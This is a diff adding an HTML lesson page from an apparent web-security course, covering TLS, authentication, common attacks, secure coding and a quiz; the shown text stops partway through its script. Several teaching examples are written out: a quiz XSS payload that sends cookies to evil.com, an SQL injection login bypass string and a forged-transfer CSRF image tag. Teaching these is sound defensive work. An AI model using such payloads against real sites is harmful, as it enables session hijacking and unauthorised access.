@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" href="favicon.svg" type="image/svg+xml" />
+  <script src="analytics.js" defer></script>
+  <title>Web Security — Helix Web & Internet</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" /><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    :root{--bg:#050816;--bg-2:#0C1022;--border:rgba(255,255,255,0.07);--amber:#F59E0B;--amber-l:#FCD34D;--primary:#6366F1;--cyan:#22D3EE;--green:#10B981;--red:#EF4444;--violet:#8B5CF6;--text:#EEF2F8;--text-2:#8892A4;--text-3:#2D3A4E;--nav-h:60px;--acc:#EC4899;--acc-l:#F472B6;--acc-d:#BE185D;}
+    html{scroll-behavior:smooth;}body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased;}
+    a{color:inherit;text-decoration:none;}button{font-family:inherit;}
+    .aurora{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;filter:blur(100px) saturate(120%);}
+    .orb{position:absolute;border-radius:50%;}
+    .orb-1{width:500px;height:500px;background:radial-gradient(circle,rgba(236,72,153,0.12) 0%,transparent 65%);top:-80px;right:0;}
+    .orb-2{width:600px;height:600px;background:radial-gradient(circle,rgba(139,92,246,0.12) 0%,transparent 65%);bottom:-150px;left:-100px;}
+    .app{display:grid;grid-template-columns:280px 1fr;grid-template-rows:var(--nav-h) 1fr;grid-template-areas:"nav nav" "sidebar main";min-height:100vh;position:relative;z-index:1;}
+    .topnav{grid-area:nav;display:flex;align-items:center;justify-content:space-between;padding:0 24px;background:rgba(5,8,22,0.9);border-bottom:1px solid var(--border);backdrop-filter:blur(20px);position:sticky;top:0;z-index:100;}
+    .nav-left{display:flex;align-items:center;gap:16px;}.nav-logo{font-size:1.05rem;font-weight:800;letter-spacing:-0.03em;display:flex;align-items:center;gap:8px;}
+    .nav-sep{color:var(--text-3);}.nav-title{font-size:0.85rem;font-weight:600;color:var(--acc);}
+    .nav-right{display:flex;align-items:center;gap:10px;}
+    .nav-xp{font-size:0.78rem;font-weight:700;color:var(--acc-l);background:rgba(236,72,153,0.1);border:1px solid rgba(236,72,153,0.2);padding:4px 12px;border-radius:100px;}
+    .nav-back{font-size:0.8rem;color:var(--text-2);padding:5px 10px;border-radius:8px;transition:color 0.2s;}
+    .nav-back:hover{color:var(--text);background:rgba(255,255,255,0.05);}
+    .sidebar{grid-area:sidebar;border-right:1px solid var(--border);background:rgba(8,10,25,0.7);padding:24px 0;overflow-y:auto;position:sticky;top:var(--nav-h);height:calc(100vh - var(--nav-h));display:flex;flex-direction:column;}
+    .sidebar-label{font-size:0.65rem;font-weight:600;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-3);padding:0 20px;margin-bottom:8px;margin-top:20px;}
+    .sidebar-label:first-child{margin-top:0;}
+    .lesson-item{display:flex;align-items:center;gap:10px;padding:10px 20px;cursor:pointer;transition:background 0.15s;border-left:3px solid transparent;}
+    .lesson-item:hover{background:rgba(255,255,255,0.03);}
+    .lesson-item.active{background:rgba(236,72,153,0.07);border-left-color:var(--acc);}
+    .lesson-num{font-size:0.7rem;font-weight:700;color:var(--text-3);width:20px;flex-shrink:0;}
+    .lesson-item.active .lesson-num{color:var(--acc);}
+    .lesson-name{font-size:0.85rem;font-weight:500;color:var(--text-2);}
+    .lesson-item.active .lesson-name{color:var(--text);font-weight:600;}
+    .sidebar-footer{margin-top:auto;padding:20px;border-top:1px solid var(--border);}
+    .progress-bar-wrap{background:rgba(255,255,255,0.06);border-radius:100px;height:6px;overflow:hidden;margin-top:8px;}
+    .progress-bar-fill{height:100%;background:linear-gradient(90deg,var(--acc),var(--primary));border-radius:100px;transition:width 0.5s ease;}
+    .progress-label{font-size:0.72rem;color:var(--text-2);display:flex;justify-content:space-between;}
+    .main{grid-area:main;padding:40px 48px;overflow-y:auto;}
+    .lesson-section{max-width:780px;padding-bottom:80px;}
+    .lesson-section+.lesson-section{border-top:1px solid var(--border);padding-top:60px;}
+    .section-tag{font-size:0.68rem;font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:var(--acc);margin-bottom:10px;display:flex;align-items:center;gap:6px;}
+    .section-tag::before{content:'';display:block;width:20px;height:2px;background:var(--acc);border-radius:2px;}
+    h2{font-size:1.75rem;font-weight:800;letter-spacing:-0.03em;margin-bottom:14px;line-height:1.2;}
+    .lead{font-size:1rem;color:var(--text-2);line-height:1.7;margin-bottom:28px;}
+    .info-box{border-radius:14px;padding:20px 22px;margin-bottom:24px;border:1px solid;}
+    .info-box.pink{background:rgba(236,72,153,0.06);border-color:rgba(236,72,153,0.2);}
+    .info-box.amber{background:rgba(245,158,11,0.07);border-color:rgba(245,158,11,0.2);}
+    .info-box.violet{background:rgba(139,92,246,0.07);border-color:rgba(139,92,246,0.2);}
+    .info-box.green{background:rgba(16,185,129,0.07);border-color:rgba(16,185,129,0.2);}
+    .info-box.red{background:rgba(239,68,68,0.07);border-color:rgba(239,68,68,0.2);}
+    .info-box.cyan{background:rgba(34,211,238,0.07);border-color:rgba(34,211,238,0.2);}
+    .info-box-title{font-size:0.72rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;margin-bottom:8px;}
+    .info-box.pink .info-box-title{color:var(--acc);}
+    .info-box.amber .info-box-title{color:var(--amber);}
+    .info-box.violet .info-box-title{color:var(--violet);}
+    .info-box.green .info-box-title{color:var(--green);}
+    .info-box.red .info-box-title{color:var(--red);}
+    .info-box.cyan .info-box-title{color:var(--cyan);}
+    .info-box p{font-size:0.9rem;color:var(--text-2);line-height:1.65;}
+    .info-box ul{font-size:0.9rem;color:var(--text-2);line-height:1.65;padding-left:1.25rem;}
+    .info-box li{margin-bottom:4px;}
+    .code-block{background:rgba(0,0,0,0.4);border:1px solid var(--border);border-radius:12px;padding:20px 22px;font-family:'JetBrains Mono',monospace;font-size:0.82rem;line-height:1.7;overflow-x:auto;margin:20px 0;white-space:pre;}
+    .c-comment{color:#4B5563;}.c-keyword{color:#C084FC;}.c-string{color:#86EFAC;}.c-fn{color:#60A5FA;}.c-num{color:var(--amber-l);}.c-op{color:var(--acc);}
+    .c-danger{color:var(--red);}
+    .data-table{width:100%;border-collapse:collapse;margin:20px 0;font-size:0.88rem;}
+    .data-table th{background:rgba(236,72,153,0.08);color:var(--acc);font-size:0.72rem;font-weight:700;letter-spacing:0.07em;text-transform:uppercase;padding:10px 14px;text-align:left;border-bottom:1px solid rgba(236,72,153,0.2);}
+    .data-table td{padding:10px 14px;border-bottom:1px solid var(--border);color:var(--text-2);}
+    .data-table td:first-child{color:var(--text);font-weight:600;}
+    .data-table tr:last-child td{border-bottom:none;}
+    .widget{background:rgba(8,10,28,0.9);border:1px solid var(--border);border-radius:16px;padding:24px;margin:24px 0;}
+    .widget h4{font-size:0.78rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:8px;}
+    .attack-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px;margin-bottom:16px;}
+    .attack-btn{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:10px;padding:12px;font-size:0.8rem;font-weight:600;color:var(--text-2);cursor:pointer;transition:all 0.15s;text-align:center;}
+    .attack-btn:hover,.attack-btn.active{border-color:var(--red);color:var(--red);background:rgba(239,68,68,0.07);}
+    .attack-detail{background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;padding:16px;font-size:0.85rem;color:var(--text-2);line-height:1.65;min-height:80px;}
+    .attack-detail strong{color:var(--text);}
+    .challenge{background:rgba(236,72,153,0.04);border:1px solid rgba(236,72,153,0.18);border-radius:14px;padding:22px 24px;margin:24px 0;}
+    .challenge-header{display:flex;align-items:center;gap:10px;margin-bottom:12px;}
+    .challenge-badge{font-size:0.68rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:var(--acc);background:rgba(236,72,153,0.1);padding:3px 10px;border-radius:100px;border:1px solid rgba(236,72,153,0.25);}
+    .challenge-xp{font-size:0.68rem;font-weight:700;color:var(--amber-l);background:rgba(245,158,11,0.1);padding:3px 8px;border-radius:6px;margin-left:auto;}
+    .challenge h4{font-size:1rem;font-weight:700;margin-bottom:10px;}
+    .challenge p{font-size:0.88rem;color:var(--text-2);line-height:1.65;margin-bottom:14px;}
+    .challenge-input-row{display:flex;gap:10px;align-items:center;flex-wrap:wrap;}
+    .challenge-input{background:rgba(255,255,255,0.06);border:1px solid var(--border);border-radius:8px;padding:9px 14px;font-family:'JetBrains Mono',monospace;font-size:0.95rem;color:var(--text);outline:none;transition:border 0.2s;}
+    .challenge-input:focus{border-color:var(--acc);}
+    .challenge-btn{background:linear-gradient(135deg,var(--acc-d),var(--primary));color:#fff;border:none;border-radius:8px;padding:9px 20px;font-size:0.82rem;font-weight:800;cursor:pointer;transition:opacity 0.2s;}
+    .challenge-feedback{font-size:0.85rem;margin-top:10px;min-height:22px;line-height:1.5;}
+    .challenge-feedback.correct{color:var(--green);}.challenge-feedback.wrong{color:var(--red);}
+    .challenge-hint-btn{background:none;border:1px solid var(--border);border-radius:7px;padding:7px 14px;font-size:0.78rem;color:var(--text-2);cursor:pointer;}
+    .challenge-hint{font-size:0.82rem;color:var(--acc);margin-top:8px;display:none;}
+    .quiz-card{background:rgba(8,10,28,0.8);border:1px solid var(--border);border-radius:16px;padding:24px;margin-bottom:18px;}
+    .quiz-q{font-size:0.95rem;font-weight:600;margin-bottom:16px;line-height:1.5;}
+    .quiz-options{display:flex;flex-direction:column;gap:8px;}
+    .quiz-opt{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:10px;padding:11px 16px;font-size:0.88rem;color:var(--text-2);cursor:pointer;text-align:left;transition:all 0.15s;}
+    .quiz-opt:hover:not(:disabled){background:rgba(255,255,255,0.06);border-color:rgba(255,255,255,0.15);color:var(--text);}
+    .quiz-opt.correct{background:rgba(16,185,129,0.12);border-color:var(--green);color:var(--green);}
+    .quiz-opt.wrong{background:rgba(239,68,68,0.12);border-color:var(--red);color:var(--red);}
+    .quiz-feedback{font-size:0.82rem;margin-top:10px;min-height:20px;color:var(--text-2);}
+    .quiz-feedback.correct{color:var(--green);}.quiz-feedback.wrong{color:var(--red);}
+    .complete-section{margin-top:60px;padding-top:40px;border-top:1px solid var(--border);text-align:center;}
+    .complete-btn{background:linear-gradient(135deg,var(--acc-d),var(--primary));color:#fff;border:none;border-radius:14px;padding:16px 48px;font-size:1rem;font-weight:800;cursor:pointer;letter-spacing:-0.01em;transition:all 0.2s;display:inline-flex;align-items:center;gap:10px;}
+    .complete-btn:disabled{opacity:0.35;cursor:not-allowed;}
+    .complete-btn:not(:disabled):hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(236,72,153,0.25);}
+    .complete-note{font-size:0.8rem;color:var(--text-3);margin-top:12px;}
+    .xp-toast{position:fixed;bottom:32px;right:32px;background:linear-gradient(135deg,rgba(236,72,153,0.15),rgba(99,102,241,0.15));border:1px solid rgba(236,72,153,0.3);border-radius:12px;padding:12px 20px;font-size:0.88rem;font-weight:700;color:var(--acc-l);z-index:999;opacity:0;transform:translateY(16px);transition:all 0.35s cubic-bezier(.34,1.56,.64,1);pointer-events:none;display:flex;align-items:center;gap:8px;}
+    .xp-toast.show{opacity:1;transform:translateY(0);}
+    @media(max-width:860px){.app{grid-template-columns:1fr;grid-template-areas:"nav" "main";}.sidebar{display:none;}.main{padding:24px 20px;}}
+  </style>
+</head>
+<body>
+<div class="aurora"><div class="orb orb-1"></div><div class="orb orb-2"></div></div>
+<div class="app">
+  <nav class="topnav">
+    <div class="nav-left">
+      <div class="nav-logo">
+        <svg width="22" height="22" viewBox="0 0 40 40" fill="none">
+          <path d="M20 4 C26 4 30 10 28 16 C26 22 20 26 20 26 C20 26 14 22 12 16 C10 10 14 4 20 4Z" fill="#EC4899" opacity="0.9"/>
+          <path d="M20 36 C14 36 10 30 12 24 C14 18 20 14 20 14 C20 14 26 18 28 24 C30 30 26 36 20 36Z" fill="#6366F1" opacity="0.9"/>
+        </svg>Helix
+      </div>
+      <span class="nav-sep">/</span><span class="nav-title">Web Security</span>
+    </div>
+    <div class="nav-right">
+      <span class="nav-xp" id="navXp">0 XP</span>
+      <a href="web-internet.html" class="nav-back">← Web &amp; Internet</a>
+    </div>
+  </nav>
+  <aside class="sidebar">
+    <div class="sidebar-label">Module 03</div>
+    <div class="lesson-item active" onclick="scrollToLesson('l1')"><span class="lesson-num">01</span><span class="lesson-name">HTTPS &amp; TLS</span></div>
+    <div class="lesson-item" onclick="scrollToLesson('l2')"><span class="lesson-num">02</span><span class="lesson-name">Authentication</span></div>
+    <div class="lesson-item" onclick="scrollToLesson('l3')"><span class="lesson-num">03</span><span class="lesson-name">Common Attacks</span></div>
+    <div class="lesson-item" onclick="scrollToLesson('l4')"><span class="lesson-num">04</span><span class="lesson-name">Secure Coding</span></div>
+    <div class="sidebar-label">Practice</div>
+    <div class="lesson-item" onclick="scrollToLesson('quiz')"><span class="lesson-num">📝</span><span class="lesson-name">Quiz</span></div>
+    <div class="sidebar-footer">
+      <div class="progress-label"><span>Module progress</span><span id="prog-label">0%</span></div>
+      <div class="progress-bar-wrap"><div class="progress-bar-fill" id="prog-fill" style="width:0%"></div></div>
+    </div>
+  </aside>
+  <main class="main">
+
+  <section class="lesson-section" id="l1">
+    <div class="section-tag">Lesson 01 · Web &amp; Internet</div>
+    <h2>HTTPS &amp; TLS</h2>
+    <p class="lead"><strong>HTTPS</strong> is HTTP run over <strong>TLS (Transport Layer Security)</strong>. It provides three guarantees: <em>confidentiality</em> (data is encrypted), <em>integrity</em> (data can't be tampered with), and <em>authentication</em> (you're talking to who you think you are).</p>
+    <div class="info-box pink">
+      <div class="info-box-title">🔐 TLS Handshake Overview</div>
+      <ul>
+        <li><strong>1. Client Hello</strong> — browser sends supported TLS versions, cipher suites, a random nonce</li>
+        <li><strong>2. Server Hello</strong> — server picks a cipher, sends its certificate</li>
+        <li><strong>3. Certificate Validation</strong> — browser verifies the cert chain to a trusted CA</li>
+        <li><strong>4. Key Exchange</strong> — both sides derive a shared session key (without transmitting it)</li>
+        <li><strong>5. Encrypted Traffic</strong> — all further data is encrypted with the session key</li>
+      </ul>
+    </div>
+    <div class="info-box amber">
+      <div class="info-box-title">📜 Certificates &amp; CAs</div>
+      <p>A <strong>TLS certificate</strong> proves the server is who it claims to be. It's issued by a <strong>Certificate Authority (CA)</strong> that your OS and browser inherently trust. Services like <strong>Let's Encrypt</strong> provide free certificates. Without a valid cert, browsers show a security warning.</p>
+    </div>
+    <div class="code-block"><span class="c-comment"># Check a site's certificate</span>
+openssl s_client -connect example.com:<span class="c-num">443</span> -showcerts
+
+<span class="c-comment"># HTTP headers that improve security</span>
+Strict-Transport-Security: max-age=<span class="c-num">31536000</span>; includeSubDomains
+<span class="c-comment"># Forces HTTPS for 1 year — even if user types http://</span>
+
+Content-Security-Policy: default-src <span class="c-string">'self'</span>
+<span class="c-comment"># Restricts what resources the page can load</span>
+
+X-Frame-Options: DENY
+<span class="c-comment"># Prevents clickjacking by disallowing iframes</span></div>
+    <div class="challenge" id="chal-1">
+      <div class="challenge-header"><span class="challenge-badge">Challenge 1</span><span class="challenge-xp">+15 XP</span></div>
+      <h4>TLS Guarantee</h4>
+      <p>TLS provides three guarantees. Name the one that ensures data wasn't modified in transit: <strong>integrity</strong></p>
+      <div class="challenge-input-row">
+        <input class="challenge-input" id="c1-inp" placeholder="your answer" style="width:160px"/>
+        <button class="challenge-btn" onclick="checkChallenge(1,'integrity')">Check</button>
+        <button class="challenge-hint-btn" onclick="toggleHint(1)">Hint</button>
+      </div>
+      <div class="challenge-hint" id="hint-1">Confidentiality = private, Authentication = identity, ___ = untampered.</div>
+      <div class="challenge-feedback" id="c1-fb"></div>
+    </div>
+  </section>
+
+  <section class="lesson-section" id="l2">
+    <div class="section-tag">Lesson 02 · Web &amp; Internet</div>
+    <h2>Authentication</h2>
+    <p class="lead"><strong>Authentication</strong> answers "who are you?" — verifying identity. <strong>Authorisation</strong> answers "what can you do?" — controlling access. They are distinct problems and must be solved separately.</p>
+    <div class="info-box violet">
+      <div class="info-box-title">🎟️ Session vs Token Auth</div>
+      <ul>
+        <li><strong>Session cookies</strong> — server stores session in DB; client holds a session ID in a cookie. Stateful. Easier to revoke.</li>
+        <li><strong>JWT (JSON Web Token)</strong> — self-contained token signed by the server. Stateless. Client sends it in every request header. Cannot easily be revoked.</li>
+        <li><strong>OAuth 2.0</strong> — delegated authorisation (Sign in with Google/GitHub). You don't handle passwords.</li>
+      </ul>
+    </div>
+    <div class="code-block"><span class="c-comment"># JWT structure (base64url encoded)</span>
+header.payload.signature
+
+<span class="c-comment"># Header</span>
+{ <span class="c-string">"alg"</span>: <span class="c-string">"HS256"</span>, <span class="c-string">"typ"</span>: <span class="c-string">"JWT"</span> }
+
+<span class="c-comment"># Payload (claims)</span>
+{ <span class="c-string">"sub"</span>: <span class="c-string">"user_42"</span>, <span class="c-string">"role"</span>: <span class="c-string">"admin"</span>, <span class="c-string">"exp"</span>: <span class="c-num">1735689600</span> }
+
+<span class="c-comment"># Signature — verifies the token wasn't tampered with</span>
+HMAC-SHA256(base64(header) + <span class="c-string">"."</span> + base64(payload), secret)
+
+<span class="c-comment"># Sending a JWT</span>
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</div>
+    <div class="info-box green">
+      <div class="info-box-title">✅ Password Best Practices</div>
+      <ul>
+        <li>Never store passwords in plaintext — always hash with bcrypt, Argon2, or scrypt</li>
+        <li>Add a unique salt per password to defeat rainbow tables</li>
+        <li>Use bcrypt with cost factor ≥ 12 for new systems</li>
+        <li>Implement rate limiting and lockout to prevent brute force</li>
+        <li>Offer MFA — it's the single best security upgrade available</li>
+      </ul>
+    </div>
+    <div class="challenge" id="chal-2">
+      <div class="challenge-header"><span class="challenge-badge">Challenge 2</span><span class="challenge-xp">+15 XP</span></div>
+      <h4>Password Storage</h4>
+      <p>You should never store passwords in plaintext. What should you store instead? Type: <strong>hash</strong></p>
+      <div class="challenge-input-row">
+        <input class="challenge-input" id="c2-inp" placeholder="your answer" style="width:140px"/>
+        <button class="challenge-btn" onclick="checkChallenge(2,'hash')">Check</button>
+        <button class="challenge-hint-btn" onclick="toggleHint(2)">Hint</button>
+      </div>
+      <div class="challenge-hint" id="hint-2">A one-way function output that can verify a password without storing the original.</div>
+      <div class="challenge-feedback" id="c2-fb"></div>
+    </div>
+  </section>
+
+  <section class="lesson-section" id="l3">
+    <div class="section-tag">Lesson 03 · Web &amp; Internet</div>
+    <h2>Common Attacks</h2>
+    <p class="lead">Knowing how attacks work is the first step to defending against them. The <strong>OWASP Top 10</strong> lists the most critical web application security risks. These appear in real applications every day.</p>
+
+    <div class="widget">
+      <h4>⚠️ Attack Type Explorer</h4>
+      <p style="font-size:0.82rem;color:var(--text-2);margin-bottom:14px;">Click an attack to learn how it works and how to prevent it:</p>
+      <div class="attack-grid">
+        <button class="attack-btn active" id="ab-sqli" onclick="showAttack('sqli')">SQL Injection</button>
+        <button class="attack-btn" id="ab-xss" onclick="showAttack('xss')">XSS</button>
+        <button class="attack-btn" id="ab-csrf" onclick="showAttack('csrf')">CSRF</button>
+        <button class="attack-btn" id="ab-mitm" onclick="showAttack('mitm')">MITM</button>
+        <button class="attack-btn" id="ab-idor" onclick="showAttack('idor')">IDOR</button>
+        <button class="attack-btn" id="ab-rce" onclick="showAttack('rce')">RCE</button>
+      </div>
+      <div class="attack-detail" id="attackDetail"></div>
+    </div>
+
+    <div class="code-block"><span class="c-comment"># SQL Injection — vulnerable code</span>
+query = <span class="c-danger">"SELECT * FROM users WHERE name='" + username + "'"</span>
+<span class="c-comment"># Attacker inputs: ' OR '1'='1 — returns ALL users</span>
+
+<span class="c-comment"># Safe — parameterised query</span>
+cursor.<span class="c-fn">execute</span>(<span class="c-string">"SELECT * FROM users WHERE name=?"</span>, (username,))
+
+<span class="c-comment"># XSS — vulnerable</span>
+div.innerHTML = <span class="c-danger">userInput</span>  <span class="c-comment"># executes &lt;script&gt; tags</span>
+
+<span class="c-comment"># XSS — safe</span>
+div.textContent = userInput  <span class="c-comment"># treated as plain text</span></div>
+
+    <div class="challenge" id="chal-3">
+      <div class="challenge-header"><span class="challenge-badge">Challenge 3</span><span class="challenge-xp">+15 XP</span></div>
+      <h4>Injection Defence</h4>
+      <p>The best defence against SQL injection is to use <strong>parameterised queries</strong> (also called prepared statements), which separate SQL code from data. What is the other name for this technique? Type: <strong>prepared statements</strong></p>
+      <div class="challenge-input-row">
+        <input class="challenge-input" id="c3-inp" placeholder="your answer" style="width:220px"/>
+        <button class="challenge-btn" onclick="checkChallenge(3,'prepared statements')">Check</button>
+        <button class="challenge-hint-btn" onclick="toggleHint(3)">Hint</button>
+      </div>
+      <div class="challenge-hint" id="hint-3">cursor.execute("SELECT ... WHERE id=?", (id,)) — the ? is the placeholder in a _____ _____.</div>
+      <div class="challenge-feedback" id="c3-fb"></div>
+    </div>
+  </section>
+
+  <section class="lesson-section" id="l4">
+    <div class="section-tag">Lesson 04 · Web &amp; Internet</div>
+    <h2>Secure Coding</h2>
+    <p class="lead">Security isn't a feature you add at the end — it's a discipline baked into every line of code. Following secure coding principles dramatically reduces your attack surface.</p>
+    <div class="info-box pink">
+      <div class="info-box-title">🛡️ Core Security Principles</div>
+      <ul>
+        <li><strong>Least Privilege</strong> — grant only the minimum permissions needed; a DB user for read queries shouldn't have DELETE access</li>
+        <li><strong>Defence in Depth</strong> — multiple independent security layers; one failure shouldn't compromise everything</li>
+        <li><strong>Never Trust User Input</strong> — validate, sanitise, and escape all input on the server</li>
+        <li><strong>Fail Secure</strong> — when something goes wrong, default to the more secure state (deny, not allow)</li>
+        <li><strong>Keep Secrets Secret</strong> — never commit API keys, passwords, or tokens to version control</li>
+      </ul>
+    </div>
+    <div class="code-block"><span class="c-comment"># Environment variables for secrets</span>
+<span class="c-keyword">import</span> os
+DB_PASSWORD = os.<span class="c-fn">environ</span>[<span class="c-string">'DB_PASSWORD'</span>]  <span class="c-comment"># ✓</span>
+DB_PASSWORD = <span class="c-danger">"hunter2"</span>                   <span class="c-comment"># ✗ NEVER</span>
+
+<span class="c-comment"># Input validation</span>
+<span class="c-keyword">def</span> <span class="c-fn">get_user</span>(user_id):
+    <span class="c-keyword">if not</span> isinstance(user_id, <span class="c-fn">int</span>) <span class="c-keyword">or</span> user_id &lt; <span class="c-num">1</span>:
+        <span class="c-keyword">raise</span> ValueError(<span class="c-string">"Invalid user ID"</span>)
+    <span class="c-keyword">return</span> db.<span class="c-fn">query</span>(<span class="c-string">"SELECT * FROM users WHERE id=?"</span>, (user_id,))
+
+<span class="c-comment"># Rate limiting (pseudo-code)</span>
+<span class="c-keyword">if</span> login_attempts(ip) > <span class="c-num">5</span>:
+    <span class="c-keyword">raise</span> TooManyRequests(<span class="c-string">"Try again in 15 minutes"</span>)</div>
+    <div class="info-box green">
+      <div class="info-box-title">🔒 Security Headers Checklist</div>
+      <ul>
+        <li><strong>HSTS</strong> — enforces HTTPS for future visits</li>
+        <li><strong>CSP</strong> — controls what resources can be loaded (XSS mitigation)</li>
+        <li><strong>X-Frame-Options</strong> — prevents clickjacking</li>
+        <li><strong>X-Content-Type-Options: nosniff</strong> — prevents MIME sniffing attacks</li>
+        <li><strong>Referrer-Policy</strong> — controls what's in the Referer header</li>
+      </ul>
+    </div>
+    <div class="challenge" id="chal-4">
+      <div class="challenge-header"><span class="challenge-badge">Challenge 4</span><span class="challenge-xp">+15 XP</span></div>
+      <h4>Principle of Least Privilege</h4>
+      <p>A microservice only reads data from a database. Following the principle of least privilege, it should have what type of access? Type: <strong>read</strong></p>
+      <div class="challenge-input-row">
+        <input class="challenge-input" id="c4-inp" placeholder="access type" style="width:140px"/>
+        <button class="challenge-btn" onclick="checkChallenge(4,'read')">Check</button>
+        <button class="challenge-hint-btn" onclick="toggleHint(4)">Hint</button>
+      </div>
+      <div class="challenge-hint" id="hint-4">Minimum needed = SELECT only. No INSERT, UPDATE, or DELETE.</div>
+      <div class="challenge-feedback" id="c4-fb"></div>
+    </div>
+  </section>
+
+  <section class="lesson-section" id="quiz">
+    <div class="section-tag">Practice · Web &amp; Internet</div>
+    <h2>Knowledge Check</h2>
+    <p class="lead">Test your understanding of web security fundamentals.</p>
+
+    <div class="quiz-card" id="q1">
+      <div class="quiz-q">1. What does TLS provide that plain HTTP does not?</div>
+      <div class="quiz-options">
+        <button class="quiz-opt" onclick="answerQuiz(1,'a')">a) Faster page load times</button>
+        <button class="quiz-opt" onclick="answerQuiz(1,'b')">b) Compression of HTTP headers</button>
+        <button class="quiz-opt" onclick="answerQuiz(1,'c')">c) Encryption, integrity, and server authentication</button>
+        <button class="quiz-opt" onclick="answerQuiz(1,'d')">d) Persistent connections between requests</button>
+      </div>
+      <div class="quiz-feedback" id="qf1"></div>
+    </div>
+
+    <div class="quiz-card" id="q2">
+      <div class="quiz-q">2. An attacker injects <code style="font-family:monospace">&lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;</code> into a comment field. This is a:</div>
+      <div class="quiz-options">
+        <button class="quiz-opt" onclick="answerQuiz(2,'a')">a) SQL Injection attack</button>
+        <button class="quiz-opt" onclick="answerQuiz(2,'b')">b) Cross-Site Scripting (XSS) attack</button>
+        <button class="quiz-opt" onclick="answerQuiz(2,'c')">c) CSRF attack</button>
+        <button class="quiz-opt" onclick="answerQuiz(2,'d')">d) Man-in-the-Middle attack</button>
+      </div>
+      <div class="quiz-feedback" id="qf2"></div>
+    </div>
+
+    <div class="quiz-card" id="q3">
+      <div class="quiz-q">3. Which of the following is the safest way to store user passwords?</div>
+      <div class="quiz-options">
+        <button class="quiz-opt" onclick="answerQuiz(3,'a')">a) Encrypted with AES-256</button>
+        <button class="quiz-opt" onclick="answerQuiz(3,'b')">b) Hashed with MD5</button>
+        <button class="quiz-opt" onclick="answerQuiz(3,'c')">c) Stored in plaintext in a secure database</button>
+        <button class="quiz-opt" onclick="answerQuiz(3,'d')">d) Hashed with bcrypt and a unique salt per user</button>
+      </div>
+      <div class="quiz-feedback" id="qf3"></div>
+    </div>
+
+    <div class="quiz-card" id="q4">
+      <div class="quiz-q">4. What is the purpose of CSRF tokens?</div>
+      <div class="quiz-options">
+        <button class="quiz-opt" onclick="answerQuiz(4,'a')">a) To encrypt the user's session data</button>
+        <button class="quiz-opt" onclick="answerQuiz(4,'b')">b) To prevent attackers on other sites from submitting forms on behalf of authenticated users</button>
+        <button class="quiz-opt" onclick="answerQuiz(4,'c')">c) To validate SQL queries before execution</button>
+        <button class="quiz-opt" onclick="answerQuiz(4,'d')">d) To rate-limit login attempts</button>
+      </div>
+      <div class="quiz-feedback" id="qf4"></div>
+    </div>
+
+    <div class="complete-section">
+      <button class="complete-btn" id="completeBtn" onclick="completeModule()" disabled>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+        Complete Module
+      </button>
+      <p class="complete-note" id="completeNote">Complete all 4 challenges and the quiz to unlock.</p>
+    </div>
+  </section>
+
+  </main>
+</div>
+<div class="xp-toast" id="xpToast">⚡ +<span id="toastAmt">15</span> XP</div>
+
+<script>
+const STORAGE_KEY='helix_web_progress';
+const MODULE_KEY='security';
+let xp=0,challenges={},quizAnswers={};
+
+const ATTACKS={
+  sqli:{name:'SQL Injection',desc:'<strong>What:</strong> Attacker inserts SQL code into input fields, manipulating the database query.<br><br><strong>Example:</strong> Username field input: <code>\' OR \'1\'=\'1</code> — bypasses login entirely.<br><br><strong>Fix:</strong> Always use parameterised queries / prepared statements. Never concatenate user input into SQL strings.'},
+  xss:{name:'Cross-Site Scripting (XSS)',desc:'<strong>What:</strong> Attacker injects malicious JavaScript into pages viewed by other users.<br><br><strong>Example:</strong> A comment containing <code>&lt;script&gt;steal(document.cookie)&lt;/script&gt;</code> executes in every reader\'s browser.<br><br><strong>Fix:</strong> Escape output (use textContent not innerHTML). Implement a strict Content-Security-Policy header.'},
+  csrf:{name:'Cross-Site Request Forgery (CSRF)',desc:'<strong>What:</strong> Attacker tricks an authenticated user\'s browser into making unintended requests to another site.<br><br><strong>Example:</strong> Malicious page has <code>&lt;img src="bank.com/transfer?to=attacker&amp;amt=1000"&gt;</code> — the user\'s browser sends their cookies automatically.<br><br><strong>Fix:</strong> Use CSRF tokens (unique per session). Validate the Origin/Referer header. Use SameSite=Strict cookies.'},
+  mitm:{name:'Man-in-the-Middle (MITM)',desc:'<strong>What:</strong> Attacker intercepts communication between client and server on an unencrypted network.<br><br><strong>Example:</strong> On public Wi-Fi, an attacker reads your HTTP traffic and steals your session cookie.<br><br><strong>Fix:</strong> Use HTTPS everywhere. Implement HSTS (HTTP Strict Transport Security). Never send sensitive data over HTTP.'},
+  idor:{name:'Insecure Direct Object Reference (IDOR)',desc:'<strong>What:</strong> Application exposes internal object IDs without access control checks, allowing users to access other users\' data.<br><br><strong>Example:</strong> URL <code>/api/invoices/1234</code> — changing to <code>/api/invoices/1235</code> reveals another user\'s invoice.<br><br><strong>Fix:</strong> Always verify the authenticated user owns the requested resource. Never trust client-provided IDs alone.'},
